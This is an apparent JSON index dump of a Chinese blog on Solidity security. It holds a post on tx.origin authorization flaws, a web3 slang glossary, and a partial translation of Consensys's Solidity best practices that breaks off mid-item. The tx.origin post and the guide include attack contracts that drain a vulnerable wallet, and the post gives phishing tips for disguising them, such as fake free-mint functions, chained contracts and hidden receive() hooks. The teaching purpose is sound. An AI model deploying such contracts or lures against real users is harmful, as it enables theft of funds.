[{"categories":["基础知识","合约安全"],"content":"1 前言 在合约代码中，最常用的是使用 msg.sender 来检查授权，但有时由于有些程序员不熟悉 tx.origin 和 msg.sender 的区别，如果使用了 tx.origin 可能导致合约的安全问题。黑客最典型的攻击场景是利用 tx.origin 的代码问题常与钓鱼攻击相结合的组合拳的方式进行攻击。 tx.origin是 Solidity 中的一个全局变量，它返回发送交易的账户地址。如果授权帐户调用恶意合约，使用变量进行授权可能会使合约容易受到攻击。可以调用通过授权检查的易受攻击的合约，因为tx.origin返回交易的原始发件人，在这种情况下是授权帐户。 通过调用 tx.origin 来检查授权可能会导致合约受到攻击，因为 tx.origin 返回交易的原始发送者，因为攻击的调用链可能是 原始发送者－\u003e攻击合约－\u003e 受攻击合约 。在受攻击合约中，tx.origin 是原始发送者。 ","date":"2021-10-01","objectID":"/posts/unsafe-problems-caused-by-tx-origin-authorization-in-smart-contracts.html:1:0","tags":["基础知识","合约安全"],"title":"智能合约中通过 tx.origin 授权引发的不安全问题","uri":"/posts/unsafe-problems-caused-by-tx-origin-authorization-in-smart-contracts.html"},{"categories":["基础知识","合约安全"],"content":"2 前置知识 两者都是 Solidity 中的一个全局变量。 msg.sender: 指直接调用智能合约功能的帐户或智能合约的地址 tx.origin: 指调用智能合约功能的账户地址，只有账户地址可以是tx.origin EOA 账户和合约账户 EOA 账户和合约账户 以太坊账户分两种，外部账户(EOA)和合约账户(SCA)。 外部账户由一对公私钥进行管理，账户包含着 Ether 的余额。 合约账户除了可以含有 Ether 余额外，还拥有一段特定的代码，预先设定代码逻辑在外部账户或其他合约对其合约地址发送消息或发生交易时被调用和处理。 外部账户 EOA 由公私钥对控制 拥有 ether 余额 可以发送交易（transactions） 不包含相关执行代码 合约账户 拥有 ether 余额 含有执行代码 代码仅在该合约地址发生交易或者收到其他合约发送的信息时才会被执行 拥有自己的独立存储状态，且可以调用其他合约 msg.sender 和 tx.origin 的区别 tx.origin：表示最初的调用者，通常取得的是 EOA 的地址。 msg.sender：表示最近的调用者，通常取得是的上级调用者的地址，可以是 EOA 地址，也可以是合约地址。 如果 EOA 用户 A 调用合约 B，合约 B 调用合约 C。那么 在 C 合约中，msg.sender 就是 B 合约的地址，tx.origin 为 A 地址。 在 B 合约中，msg.sender 是 A 地址，tx.origin 也为 A 地址。 通过判断tx.origin==msg.sender来确定调用者是合约还是 EOA 账户。 思考 ：可不可以通过判断一个账户的是否包含执行代码来区分这个账户是 EOA 还是 SCA? 不可以。因为一个合约地址的 CODESIZE是大于零的，但当地址的 CODESIZE等于零时，并不能保证其为非合约，因为合约在构造阶段 CODESIZE也为零。 ","date":"2021-10-01","objectID":"/posts/unsafe-problems-caused-by-tx-origin-authorization-in-smart-contracts.html:2:0","tags":["基础知识","合约安全"],"title":"智能合约中通过 tx.origin 授权引发的不安全问题","uri":"/posts/unsafe-problems-caused-by-tx-origin-authorization-in-smart-contracts.html"},{"categories":["基础知识","合约安全"],"content":"3 漏洞演示 下面的漏洞合约代码，在 transfer 方法中做了检查，本意是只有 owner 可以进行 transfer 操作。在这里使用的是tx.origin==owner进行检查。我们假设该 Wallet 合约的部署者是 Alice. contract Wallet { address public owner; constructor() payable { owner = msg.sender; } function transfer(address payable _to, uint _amount) public { require(tx.origin == owner, \"Not owner\"); (bool sent, ) = _to.call{value: _amount}(\"\"); require(sent, \"Failed to send Ether\"); } } 黑客(假设 Eve 为黑客)可以这样进行漏洞利用。 黑客编写一个 Attack 的合约，并进行部署。 黑客通过钓鱼等手段诱导 Wallet 合约的部署者调用 Attack 合约的 attack 方法。 黑客就窃取到了 Wallet 合约的 ETH。 Attack 合约代码 contract Attack { address payable public owner; Wallet wallet; constructor(Wallet _wallet) { wallet = Wallet(_wallet); owner = payable(msg.sender); } function attack() public { wallet.transfer(owner, address(wallet).balance); } } 在这个过程中，Alice 调用了 Attack 合约的 attack 方法，attack 方法调用了 wallet 合约的 transfer 方法，在 transfer 方法中 tx.origin 是 alice(在 transfer 方法中 tx.sender 是 attack 合约)，因为 alice 就是 Wallet 合约的 owner，因此通过检测，将 ETH 转给了黑客 Eve。 还有个疑问，Alice 会傻到去调用 Eve 的合约吗？ 这依靠黑客 Eve 的钓鱼的手法，如果像上面的 attack 方法 Alice 一般不会上当，但如果方法名假装成免费 mint NFT 的函数 freemint，且代码里调用了其它的大量的正常代码，并且调用了其他的合约 C，在 C 合约里调用 wallet.transfer，可能就很难识别出该方法有问题了。而且 Alice 在正常生活中使用 DAPP 时(如使用 uniswap,stepn 等时)，后端采用的也是调用合约方法的形式，相比于直接发送虚假链接发送钓鱼邮件类的邮件，Alice 对此类钓鱼的警惕性会更低些。 所以，黑客为了钓鱼更易成功，可以从下面方面进行增强 多个合约连接。合约 A 调用合约 B，合约 B 调用合约 C，合约 C 调用合约 D，…………，最后合约中调用 wallet.transfer。 黑客的合约可以利用社会工程学伪装，利用贪便宜的心理，打低价或者免费 mint 的旗号，或者高息诱惑的方式等。 黑客可以将漏洞利用隐藏在receive函数中，通过诱导用户向指定的合约转账内触发漏洞利用。如假装与用户进行换币，给客户很大的折扣诱导等。 ","date":"2021-10-01","objectID":"/posts/unsafe-problems-caused-by-tx-origin-authorization-in-smart-contracts.html:3:0","tags":["基础知识","合约安全"],"title":"智能合约中通过 tx.origin 授权引发的不安全问题","uri":"/posts/unsafe-problems-caused-by-tx-origin-authorization-in-smart-contracts.html"},{"categories":["基础知识","合约安全"],"content":"4 安全建议 建议使用 msg.sender 进行授权，而非不安全的 tx.origin ，使用不当将会造成不必要的损失。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.4; contract MyContract { address owner; constructor() { owner = msg.sender; } function sendTo(address payable receiver, uint amount) public { // 不安全写法：require(tx.origin == owner); require(msg.sender == owner); receiver.transfer(amount); } } ","date":"2021-10-01","objectID":"/posts/unsafe-problems-caused-by-tx-origin-authorization-in-smart-contracts.html:4:0","tags":["基础知识","合约安全"],"title":"智能合约中通过 tx.origin 授权引发的不安全问题","uri":"/posts/unsafe-problems-caused-by-tx-origin-authorization-in-smart-contracts.html"},{"categories":["基础知识","合约安全"],"content":"5 参考 Tips SWC-115 Authorization through tx.origin https://swcregistry.io/docs/SWC-115 代码中的 tx.origin==msg.sender 有什么作用？ https://ethereum.stackexchange.com/questions/113962/what-does-msg-sender-tx-origin-actually-do-why https://davidkathoh.medium.com/tx-origin-vs-msg-sender-93db7f234cb9 ","date":"2021-10-01","objectID":"/posts/unsafe-problems-caused-by-tx-origin-authorization-in-smart-contracts.html:5:0","tags":["基础知识","合约安全"],"title":"智能合约中通过 tx.origin 授权引发的不安全问题","uri":"/posts/unsafe-problems-caused-by-tx-origin-authorization-in-smart-contracts.html"},{"categories":["基础知识"],"content":"A ABI：Application Binary Interface，类似于API，是两个二进制程序模块之间接口。 address：钱包/合约地址。 alpha：超额收益机会。 AMA：Ask Me Anything，项目方面向公众的问答会。 AMM：Autonomous Market Making，自动化做市商，是去中心化交易所的常用技术。 ape：梭哈。 ATH：All Time High，历史最高的价格。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:1:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"B Blockchain：区块链。 Bridge：跨链桥，连接不同公链上的资产的应用。 Buy the fucking dip: 抄底。 Beeple: 数字艺术家，他出售的NFT “Everydays - The First 5000 Days” 以价格6900万美元被购买。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:2:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"C CeFi：Centralized Finance，中心化金融。 Cex：Centralized Exchange，中心化交易所。 ctf：Capture The Flag，网络安全技术比赛。 chad: 牛逼的人 。(一般指男性) ","date":"2023-03-01","objectID":"/posts/web3-slang.html:3:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"D DAO：Decentralized Autonomous Organization，去中心化自治组织。 Dapp：Decentralized Application，去中心化应用。 DeFi：Decentralized Finance，去中心化金融。 degen：degenerate，赌徒/梭哈的人。 delist：下架。 DeSci：Decentralized Science，去中心化科学。 DeSoc：Decentralized Society，去中心化社会。 DeX：Decentralized Exchange，去中心化交易所。列子：可以通过 DefiLlama 找到完整的DEX列表 Diamond hands：钻石手，长期持有代币/NFT的人。 DID：Decentralized Identity，去中心化身份。 discord：社群常用的信息传播平台。 dm：direct message，私信。 DYOR：Do Your Own Research，自己研究，自己负责。 Due diligence: 尽职调查。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:4:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"E EOA：Externally Owned Accounts，以太坊网络中的个人用户，而非智能合约地址。 ERC20：以太坊上的同质化代币标准。 ERC721：以太坊上的非同质化代币标准。 Ethereum：以太坊，一个去中心化的开源区块链网络，也是它的原生代币名字。 EVM：Ethereum Virtual Machine，以太坊虚拟机，是区块链开发人员用来在以太坊区块链上部署去中心化应用程序 (Dapp) 的软件应用程序。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:5:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"F FT: fungible token，同质化代币。 fam：family 家人。 floor price：地板价。 fren：friend，朋友。 Fomo：Fear of Missing Out，害怕踏空而盲目跟风。 FUD：Fear, Uncertainty, and Doubt，过分夸大的市场的消极信息。 FDV：Fully Diluted Valuation，即“完全稀释估值”。 FYI(for your information): 供你参考。 Full Send: 全力以赴。 flash loan: 闪电贷。在同一笔交易内完成借款和还款，常用于套利。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:6:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"G gas：燃料，表示在区块链完成交易所需的计算工作量。 gas fee：燃料费，表示在区块链完成交易所需的支付的以太坊费用。 gas limit：交易中燃料的最大消耗量。 gas price：区块链中每单位燃料的价格。 gas war：因为争抢热门项目而导致燃料飙升。 gm：good morning，早安，类似web3中的“您吃了没？”。 gn：good night，晚安。 gg: good game。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:7:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"H hacked：被黑客攻击了。 HODL：hold on dear love，钻石手，长期持有。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:8:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"I IRL：In Real Life，现实生活中。 ifykyk: 懂得都懂。 ICO: Initial Coin Offering 首次代币发行。 IFO：Initial Farm Offering 首次农场（质押）发行。 IEO：Initial Exchange Offering 首次交易所发行（比如在币安交易所发行）。 IDO：Initial DEX Offering 首次去中心化交易所发行（比如在Pancakeswap上发行）。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:9:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"L layer2：建立在现有公链上的二层框架，通常会有更快更便宜的交易、更多的存储空间。 LFG：Let’s Fucking Go！冲！梭哈！ LGTM: Looks good to me， 我看行。 liquidity：流动性。 LP token: liquidity Pool(LP) token 流动性资金池代币 列子：当用户给Uniswap/Curve 的某个资金池提供资金，会产生的一个收据凭证(可以是基础的ERC20，或者ERC 721 NFT for Uniswap V3) LP farmer： 通过在不同的去中心化平台以提供流动性来赚取收益的一部分人。因为经常需要提取收益复投，所以以此自称 Lending protocol: 允许用户存款以及借贷的平台。列子：可以通过 DefiLlama 找到完整的借贷列表 Liquid staking protocol：允许用户质押资产，并且质押凭证可以自由交易。列子：stETH 可以通过 DefiLlama 找到完整列表 LMAO：laugh my ass off 笑死我了 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:10:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"M maxi：maximalist， 极端主义者。 meme：谜因/梗，可以传播的东西。 Mempool：交易缓冲池，在交易被发出但未上链的时候，会出现在这里。 Merkle Tree：区块链用于安全验证和汇总大型数据集的数据结构。 MEV：Miner Extractable Value 或 Maximal Extractable Value，指矿工通过在一个区块中包含、排除或重新排序交易可以获得的利润。 Mint：铸造 NFT/ERC20。 Moon: to the moon, 暴涨。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:11:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"N nfa：Not Financial Advice，不是投资建议。 NFT：Non-Fungible Token，非同质化代币。 ngmi：Not ganna make it，不会成功的。 Noob：菜鸡。 Nonce：在以太坊的发送的transaction中，它的含义是与以太坊交易相关的一个数字，每笔交易nonce都会增加1，每个nonce只能使用一次。这是为了避免交易的重复。（注意在不同的环境中，nonce的意思会不同，在比如，在比特币中的nonce的含义就完全不相同） ngl：not gonna lie，老实说 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:12:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"O OG：Original Gangster，元老。 on-chain：链上。 off-chain：链下，不上链。 optimistic rollups：乐观汇总，一种以太坊layer2解决方案。 oracle：预言机， 把信息通过去中心化的方式转到链上， 通过保证传入信息的去中心化程度和准确性， 从而保持该Dapp的去中心化程度。 OAT：On-Chain Achievement Tokens，是一种可以代表出席证明或是成就证明的NFT。当你完成项目给出的任务或是符合条件，就可以获得OAT 徽章，证明你是项目活动的参与者。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:13:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"P paper hands：纸手，钻石手的反义词。 pfp：profile picture，个人头像。 PoS：Proof of Stake，权益证明，参与者通过持仓质押维护区块链网络正常运行。 PoW：Proof of Work，工作量证明，参与者通过花费计算能力和能量维护区块链网络正常运行。 prolly nothing：Probbably Nothing，可能什么都不会发生，用于卖关子。 Pump and dump：拉盘砸盘，形容一个项目被严重控盘。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:14:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"R ReFi：Regenerative Finance，可再生/可持续金融。 rekt：wrecked, 完蛋了，破产了。 roadmap：路线图（画大饼）。 RT：Retweet 推特转发。 rug：rug-pull，撤摊子/跑路/归零。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:15:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"S Sandwich Attack：三明治攻击/夹子，攻击者会抢在受害者的大笔买入订单之前买入、提高价格，在受害者订单后下达卖单，赚取收益。 SBT：Soulbound Token，灵魂绑定代币，不能交易的NFT。 shilling：推销。 Smart Contracts：智能合约，在区块链上运行的一段代码。 solidity：以太坊上的编写智能合约的语言。 sweep floor：扫地板。 Send it: 懂了，支持 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:16:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"T Tokenomics：代币经济学。 tradfi: traditional finance, 主流金融体系 TVL：Total Value Locked，协议中锁定的资金总价值。 tbh：to be honest，老实说。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:17:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"U Up Only：一直上涨（大家的美好愿望）。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:18:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"W wagmi：We are gonna make it，我们会成功的。也是一个Web3常用的react前端库的名字，包装了很多常用的hooks。 wallet：钱包。 web3.0：以去中心化和数字所有权为特征的互联网，与Web1.0和Web2.0不同。 wen：when，什么时候。 WETH：Wrapped Ethereum，ERC20标准的以太坊代币化版本。 whale：鲸鱼，持有大量资金/筹码的人。 WL：White List，白名单。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:19:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"Y Yield protocol: 提供质押收益的平台 列子：Convex， 可以通过 DefiLlama 找到完整的列表 Yield Aggregator: 通过存入质押凭证，平台能够自动复投收益 俗称机枪池。 列子： Yearn Finance 可以通过 DefiLlama 找到完整的列表 Yield-bearing Token： 随着时间的推移自行产生利息的代币。列子： stETH,SFRXETH 根据协议的不同，要区分清楚哪一个代币是自动生息 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:20:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"Z zk：zero-knowledge proof，零知识证明，可以证明一个人拥有某个秘密，但不用泄露秘密本身。 ","date":"2023-03-01","objectID":"/posts/web3-slang.html:21:0","tags":["基础知识"],"title":"让你可以在web3社区高谈阔论的黑话总结","uri":"/posts/web3-slang.html"},{"categories":["基础知识"],"content":"Metamask项目方给Solidity程序员的16个安全建议 引言 原文：Solidity Best Practices for Smart Contract Security 原文作者：Consensys（metamask项目方） 这是Metamask项目方（Consensys）在2020年8月写的一篇博客，关于智能合约安全，其中给了Solidity程序员16条安全建议，并包含代码样例。 这篇文章写于一年半前，那时候solidity版本才到0.5,现在已经是0.8了，很多函数都不同。但很多建议至今仍然适用，读完对我帮助很大。我在网上没找到中文翻译，就简单翻译了一下，并标明了版本差异可能导致的问题，供中文开发者学习。 如果您已经牢记智能合约的安全理念并且正在处理EVM的特性，那么是时候考虑一​​些特定于Solidity编程语言的安全模式了。在本综述中，我们将重点关注Solidity的安全开发建议，这些建议也可能对用其他语言开发智能合约具有指导意义。 好了，让我们开始吧。 ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:1:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"1. 正确使用 assert(), require(), revert() 便利函数 assert 和 require 可用于检查条件，如果条件不满足则抛出异常。 assert 函数只能用于测试内部错误和检查不变量。 应该使用 require 函数来确保满足有效条件，例如输入或合约状态变量，或者验证来自外部合约调用的返回值。 （0xAA注: solidity在0.8.4版本引入自定义error功能，所以这个版本之前用require，之后用revert-error来确保满足有效条件） 遵循这种范式可以让形式化分析工具来验证无效操作码永远不会被运行：这意味着代码中没有不变量被违反并且被形式化验证。 pragma solidity ^0.5.0; contract Sharer { function sendHalf(address payable addr) public payable returns (uint balance) { require(msg.value % 2 == 0, \"偶数required.\"); //Require() 可以加一个自定义消息 uint balanceBeforeTransfer = address(this).balance; (bool success, ) = addr.call.value(msg.value / 2)(\"\"); require(success); // 如果success为false，就revert。下面的总是成立。 assert(address(this).balance == balanceBeforeTransfer - msg.value / 2); // used for internal error checking return address(this).balance; } } ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:2:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"2. modifier仅用于检查 修饰符（modifier）内的代码通常在函数体之前执行，因此任何状态更改或外部调用都会违反 Checks-Effects-Interactions模式。此外，开发人员也可能不会注意到这些语句，因为修饰符的代码可能远离函数声明。例如，修饰符的外部调用可能导致重入攻击： contract Registry { address owner; function isVoter(address _addr) external returns(bool) { // Code } } contract Election { Registry registry; modifier isEligible(address _addr) { require(registry.isVoter(_addr)); _; } function vote() isEligible(msg.sender) public { // Code } } 在这种情况下，Registry合约可以通过调用isVoter()中的Election.vote() 进行重入攻击。 注意：使用modifier替换多个函数中的重复条件检查，例如 isOwner()，否则在函数内部使用require或revert。这使您的智能合约代码更具可读性和更易于审计。 ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:3:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"3. 注意整数除法的舍入 所有整数除法都向下舍入到最接近的整数。如果您需要更高的精度，请考虑使用乘数，或同时存储分子和分母。 （将来，Solidity 会有浮点类型，这会让这更容易。） // bad uint x = 5 / 2; // Result is 2, all integer divison rounds DOWN to the nearest integer 使用乘数可以防止四舍五入，在将来使用 x 时需要考虑这个乘数： // good uint multiplier = 10; uint x = (5 * multiplier) / 2; 存储分子和分母意味着你可以计算 numerator/denominator 链下的结果： // good uint numerator = 5; uint denominator = 2; ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:4:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"4. 注意抽象合约abstract和接口interface之间的权衡 接口和抽象合约都为智能合约提供了一种可定制和可重用的方法。Solidity 0.4.11中引入的接口类似于抽象合约，但不能实现任何功能。接口也有限制，例如不能访问存储或从其他接口继承，这通常使抽象合约更实用。虽然，接口对于在实现之前设计合约肯定有用。此外，重要的是要记住，如果合约继承自抽象合约，它必须通过覆盖实现所有未实现的功能，否则它也将是抽象的。 ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:5:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"5. Fallback function 后备函数 0xAA注：Solidity 0.5.0时还没有receive函数且fallback函数当时也直接声明为function()。关于最新版本的fallback函数教程，请看链接 ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:6:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"保持fallback function简单 当合约被发送一个没有参数的消息（或者没有函数匹配）或，fallback function会被调用。当被.send()或.transfer触发时，fallback function只能访问2300 gas。如果您希望能够从send()或.transfer()接收ETH，那么您在后备函数中最多可以做的就是记录一个事件。如果需要计算更多gas，请使用适当的函数。 // bad function() payable { balances[msg.sender] += msg.value; } // good function deposit() payable external { balances[msg.sender] += msg.value; } function() payable { require(msg.data.length == 0); emit LogDepositReceived(msg.sender); } ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:6:1","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"检查回退函数中的数据长度 由于 fallback function 不仅在普通以太传输（没有msg.data）时调用，并且也在没有其他函数匹配时调用，如果后备函数仅用于记录接收到的ETH，则应检查数据是否为空。否则，如果你的合约使用不正确，调用了不存在的函数，调用者将不会注意到。 // bad function() payable { emit LogDepositReceived(msg.sender); } // good function() payable { require(msg.data.length == 0); emit LogDepositReceived(msg.sender); } ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:6:2","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"6. 显式标记应付函数和状态变量 从 Solidity 0.4.0开始，每个接收以太币的函数都必须使用 payable修饰符，否则如果交易有msg.value \u003e 0 将被revert。 注意：可能不明显的事情： payable 修饰符仅适用于来自 external 合约的调用。如果我在同一个合约的payable函数中调用了一个非payable函数，这个非payable函数不会失败，尽管 msg.value不为零。 ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:7:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"7. 显式标记函数和状态变量的可见性 明确标记函数和状态变量的可见性。函数可以指定为 external， public，internal或private。请理解它们之间的差异，例如，external可能足以代替 public。而对于状态变量，external是不用的。明确标记可见性将更容易捕捉关于谁可以调用函数或访问变量的错误。 External函数是合约接口的一部分。external函数f不能在内部调用（即f() 不工作，但 this.f() 工作）。外部函数在接收大量数据时效率更高。 Public函数是合约接口的一部分，既可以在内部调用，也可以通过消息调用。对于公共状态变量，会生成一个自动 getter 函数。 Internal 函数和状态变量只能在内部访问，不使用this. Private 函数和状态变量仅对定义它们的合约可见，而在派生合约中不可见。 注意：合约内的所有内容对区块链外部的所有观察者都是可见的，甚至是 Private 变量。 // bad uint x; // the default is internal for state variables, but it should be made explicit function buy() { // the default is public // public code } // good uint private y; function buy() external { // only callable externally or using this.buy() } function utility() public { // callable externally, as well as internally: changing this code requires thinking about both cases. } function internalAction() internal { // internal code } ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:8:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"8. 将编译指示锁定到特定的编译器版本 合约应该使用与它们经过最多测试的相同编译器版本和标志来部署。锁定 pragma 有助于确保合约不会被意外部署，例如使用可能具有更高风险未发现错误的最新编译器。合约也可能由其他人部署，并且 pragma 指示原作者预期的编译器版本。 // bad pragma solidity ^0.4.4; // good pragma solidity 0.4.4; 注意：浮动 pragma 版本（即 ^0.4.25）可以用0.4.26-nightly.2018.9.25编译，但不应使用nightly版本来编译生产代码。 警告：当合约打算供其他开发人员使用时，可以允许 Pragma 语句浮动，例如库或 EthPM 包中的合约。否则，开发人员需要手动更新编译指示才能在本地编译。 ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:9:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"9. 使用事件来监控合约活动 有一种方法可以在部署后监控合约的活动是很有用的。实现这一点的一种方法是查看合约的所有交易，但这可能还不够，因为合约之间的消息调用不会记录在区块链中。此外，它只显示输入参数，而不是对状态进行的实际更改。事件也可用于触发用户界面中的功能。 contract Charity { mapping(address =\u003e uint) balances; function donate() payable public { balances[msg.sender] += msg.value; } } contract Game { function buyCoins() payable public { // 5% goes to charity charity.donate.value(msg.value / 20)(); } } 在这里， Game 合约将内部调用 Charity.donate(). 该交易不会出现在Charity 的外部交易列表中，而只在内部交易中可见。 事件是记录合约中发生的事情的便捷方式。发出的事件与其他合约数据一起留在区块链中，可供将来审计。这是对上述示例的改进，使用事件来提供慈善机构的捐赠历史。 contract Charity { // define event event LogDonate(uint _amount); mapping(address =\u003e uint) balances; function donate() payable public { balances[msg.sender] += msg.value; // emit event emit LogDonate(msg.value); } } contract Game { function buyCoins() payable public { // 5% goes to charity charity.donate.value(msg.value / 20)(); } } 在这里，无论是否直接通过合约的所有交易都 Charity 将与捐赠的金额一起显示在该合约的事件列表中。 注意：优先使用更新的 Solidity 结构。首选结构/别名，例如 selfdestruct (而不是 suicide) 和 keccak256 (而不是 sha3)。类似的模式 require(msg.sender.send(1 ether)) 也可以简化为使用 transfer()，如 msg.sender.transfer(1 ether). 查看 Solidity 更改日志 以了解更多类似更改。 ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:10:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"10. 请注意，“内置”函数可能会被隐藏 目前可以 在 Solidity 中隐藏内置的全局变量。这允许合约覆盖内置插件的功能，例如 msg 和 revert()。尽管这是有意为之，但它可能会误导合约用户对合约的真实行为。 contract PretendingToRevert { function revert() internal constant {} } contract ExampleContract is PretendingToRevert { function somethingBad() public { revert(); } } 合约用户（和审计员）应该了解他们打算使用的任何应用程序的完整智能合约源代码。 ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:11:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"11. 避免使用 tx.origin 永远不要 tx.origin 用于授权，另一个合约可以有一个方法来调用你的合约（例如，用户有一些资金）并且你的合约将授权该交易，因为你的地址位于tx.origin. contract MyContract { address owner; function MyContract() public { owner = msg.sender; } function sendTo(address receiver, uint amount) public { require(tx.origin == owner); (bool success, ) = receiver.call.value(amount)(\"\"); require(success); } } contract AttackingContract { MyContract myContract; address attacker; function AttackingContract(address myContractAddress) public { myContract = MyContract(myContractAddress); attacker = msg.sender; } function() public { myContract.sendTo(attacker, msg.sender.balance); } } 您应该使用 msg.sender 授权（如果另一个合约调用您的合约 msg.sender 将是该合约的地址，而不是调用该合约的用户的地址）。 警告：除了授权问题外， tx.origin 将来有可能从以太坊协议中删除，因此使用的代码 tx.origin 将与未来版本不兼容. Vitalik：‘不要假设 tx.origin 将继续存在。 还值得一提的是，通过使用 tx.origin 您会限制合约之间的互操作性，因为使用 tx.origin 的合约不能被另一个合约使用，因为合约不能是 tx.origin. ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:12:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"12. 时间戳依赖 使用时间戳执行合约中的关键功能时，有三个主要考虑因素，尤其是当操作涉及资金转移时。 